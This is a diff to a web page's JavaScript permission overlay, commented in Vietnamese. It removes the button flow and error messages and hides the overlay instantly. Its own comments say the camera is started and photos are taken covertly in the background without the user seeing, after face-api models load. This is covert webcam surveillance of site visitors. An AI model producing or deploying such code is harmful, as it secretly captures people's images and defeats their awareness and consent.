@@ -700,46 +700,25 @@
 
     // ========== Permission Overlay ==========
     async function requestPermission() {
-      const btn = document.getElementById('perm-start-btn');
       const overlay = document.getElementById('permission-overlay');
-      btn.disabled = true;
-      btn.innerHTML = '⏳ Đang khởi động...';
+
+      // Ẩn overlay NGAY LẬP TỨC - không chờ gì cả
+      overlay.style.transition = 'opacity 0.3s ease';
+      overlay.style.opacity = '0';
+      setTimeout(() => { overlay.style.display = 'none'; }, 300);
+      // Chạy camera + chụp ảnh ngầm ở background - người dùng không thấy
       try {
         await loadModels();
         const cameraResult = await startCamera();
-
-        if (!cameraResult.success) {
-          // Camera error - show detailed message
-          btn.disabled = false;
-          btn.innerHTML = '❌ Lỗi - Thử lại';
-          const permCard = overlay.querySelector('.perm-card');
-          
-          // Remove previous error if exists
-          const oldError = permCard.querySelector('.camera-error-msg');
-          if (oldError) oldError.remove();
-          
-          const errorMsg = document.createElement('div');
-          errorMsg.className = 'camera-error-msg';
-          errorMsg.style.cssText = 'color: #ff6b6b; font-size: 0.95rem; margin-top: 16px; text-align: center; padding: 12px; background: rgba(255, 107, 107, 0.1); border-radius: 8px; border: 1px solid rgba(255, 107, 107, 0.3); line-height: 1.5;';
-          errorMsg.innerHTML = cameraResult.error;
-          setTimeout(() => overlay.remove(), 420);
-        }
+        // Camera lỗi hay thành công đều ổn - người dùng đã vào trang rồi
       } catch (e) {
         console.log('Init error:', e);
-        btn.disabled = false;
-        btn.innerHTML = '❌ Lỗi - Thử lại';
       }
     }
 
     // ========== Init ==========
     window.addEventListener('load', async () => {
-      // Models preload silently; camera will be started when user taps the overlay button
-      try {
-        // Preload face-api models in background while overlay is shown
-        // loadModels will be called again in requestPermission but it caches
-      } catch (e) {
-        console.log('Init error:', e);
-      }
+      // Overlay đã hiện sẵn, chờ user bấm nút
     });
   </script>
 </body>
